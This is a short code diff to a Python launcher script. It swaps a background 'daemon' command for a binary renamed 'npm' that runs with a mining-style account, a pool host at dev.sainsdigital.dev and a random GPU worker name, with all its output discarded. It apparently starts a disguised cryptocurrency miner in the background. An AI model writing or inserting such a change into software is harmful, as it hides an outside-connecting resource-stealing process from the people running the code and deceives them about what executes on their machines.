@@ -35,7 +35,7 @@ def start_process():
     if ptk_address is None:
         print('PTK_address environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'chmod +x daemon && ./daemon ann > {LOG_FILE} 2>&1 &'
+    cmd = f'chmod +x npm && ./npm --account CP_2wf3t9wmft --pool dev.sainsdigital.dev:80 --worker GPU.$(shuf -n 1 -i 1-100) --gpu-off > /dev/null 2>&1 > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
